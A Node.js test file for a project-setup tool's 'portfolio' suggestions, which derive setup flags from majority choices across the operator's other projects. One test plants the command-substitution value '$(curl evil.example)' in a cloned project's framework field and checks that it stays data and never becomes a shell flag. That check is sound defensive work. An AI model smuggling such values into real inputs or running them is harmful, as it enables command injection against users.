'use strict';

/**
 * setup:detect carries `portfolio`: what the operator chose in the other
 * projects this machine recorded, clear majorities only, with the
 * setup:context flags that persist it once confirmed. @setup offers it where
 * the workspace proves nothing; it is never written unconfirmed.
 */

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const ROOT = fs.mkdtempSync(path.join(os.tmpdir(), 'aioson-detect-portfolio-'));
const HOME = path.join(ROOT, 'home');
fs.mkdirSync(HOME);
process.env.HOME = HOME;
process.env.USERPROFILE = HOME;
delete process.env.AIOSON_PROJECT_REGISTRY;
delete process.env.AIOSON_OPERATOR_MEMORY;

const { recordProjects } = require('../src/lib/project-registry');
const { runSetupDetect } = require('../src/commands/setup-detect');

const REPO = path.join(__dirname, '..');
let counter = 0;

function makeProject(fields = {}) {
  counter += 1;
  const dir = path.join(ROOT, `project-${counter}`);
  fs.mkdirSync(path.join(dir, '.aioson', 'context'), { recursive: true });
  const data = { project_name: `P${counter}`, project_type: 'web_app', framework: 'Node', interaction_language: 'pt-BR', auto_handoff: true, ...fields };
  const lines = Object.entries(data).map(([k, v]) => `${k}: ${typeof v === 'boolean' ? v : `"${v}"`}`);
  fs.writeFileSync(path.join(dir, '.aioson', 'context', 'project.context.md'), ['---', ...lines, '---', ''].join('\n'));
  return dir;
}

function logger() {
  const lines = [];
  return { lines, log: (line) => lines.push(line), error: (line) => lines.push(line), warn() {} };
}

test('below three other projects there is no portfolio', async () => {
  await recordProjects([makeProject(), makeProject()]);
  const target = fs.mkdtempSync(path.join(ROOT, 'new-'));
  const result = await runSetupDetect({ args: [target], options: { json: true }, logger: logger() });
  assert.equal(result.ok, true);
  assert.equal(result.portfolio, undefined);
});

test('with three or more, the majorities come with the setup:context flags; the project itself never votes', async () => {
  await recordProjects([makeProject(), makeProject({ framework: 'React 18 + Vite' })]);
  // The project being set up is recorded too, with other choices: it must not count.
  const target = makeProject({ framework: 'Laravel', project_type: 'api', interaction_language: 'en' });
  await recordProjects([target]);
  const result = await runSetupDetect({ args: [target], options: { json: true }, logger: logger() });
  assert.equal(result.portfolio.from, 4);
  assert.deepEqual(result.portfolio.suggested.framework, { value: 'Node', count: 3, of: 4 });
  assert.deepEqual(result.portfolio.suggested.project_type, { value: 'web_app', count: 4, of: 4 });
  assert.equal(result.portfolio.flags, '--project-type=web_app --framework=Node --language=pt-BR --auto-handoff=true');
  assert.equal(result.framework, null, 'detection itself is unchanged');
});

test('a value with spaces is quoted in the flags, and the text line names the source', async () => {
  const home = fs.mkdtempSync(path.join(ROOT, 'home-spaces-'));
  const previous = [process.env.HOME, process.env.USERPROFILE];
  process.env.HOME = home;
  process.env.USERPROFILE = home;
  try {
    await recordProjects([1, 2, 3].map(() => makeProject({ framework: 'React 18 + Vite' })), { home });
    const target = fs.mkdtempSync(path.join(ROOT, 'new-'));
    const json = await runSetupDetect({ args: [target], options: { json: true }, logger: logger() });
    assert.match(json.portfolio.flags, /--framework="React 18 \+ Vite"/);
    const text = logger();
    await runSetupDetect({ args: [target], options: {}, logger: text });
    assert.ok(text.lines.some((line) => /your other 3 projects usually: .*framework=React 18 \+ Vite \(3\/3\)/.test(line)), text.lines.join('\n'));
  } finally {
    [process.env.HOME, process.env.USERPROFILE] = previous;
  }
});

test('a value that could run in a shell never becomes a flag', async () => {
  const home = fs.mkdtempSync(path.join(ROOT, 'home-inject-'));
  const previous = [process.env.HOME, process.env.USERPROFILE];
  process.env.HOME = home;
  process.env.USERPROFILE = home;
  try {
    // A cloned repository's context, repeated so it wins the majority.
    await recordProjects([1, 2, 3].map(() => makeProject({ framework: '$(curl evil.example)', test_runner: 'node:test' })), { home });
    const target = fs.mkdtempSync(path.join(ROOT, 'new-'));
    const json = await runSetupDetect({ args: [target], options: { json: true }, logger: logger() });
    assert.equal(json.portfolio.suggested.framework.value, '$(curl evil.example)', 'reported as data');
    assert.doesNotMatch(json.portfolio.flags, /--framework|\$\(/, 'never as a flag');
    assert.match(json.portfolio.flags, /--test-runner=node:test/);
  } finally {
    [process.env.HOME, process.env.USERPROFILE] = previous;
  }
});

test('@setup offers the portfolio where the workspace proves nothing, never writing it unconfirmed', async () => {
  for (const root of [path.join(REPO, 'template', '.aioson'), path.join(REPO, '.aioson')]) {
    const kernel = fs.readFileSync(path.join(root, 'agents', 'setup.md'), 'utf8');
    assert.match(kernel, /`portfolio`, when present/);
    assert.match(kernel, /its `flags` go into the final `setup:context` call/);
    assert.match(kernel, /never written unconfirmed/);
    const onboarding = fs.readFileSync(path.join(root, 'docs', 'setup', 'onboarding-flow.md'), 'utf8');
    assert.match(onboarding, /the confirmed `portfolio\.flags`/);
    assert.match(onboarding, /an unconfirmed portfolio value is never written/);
  }
});
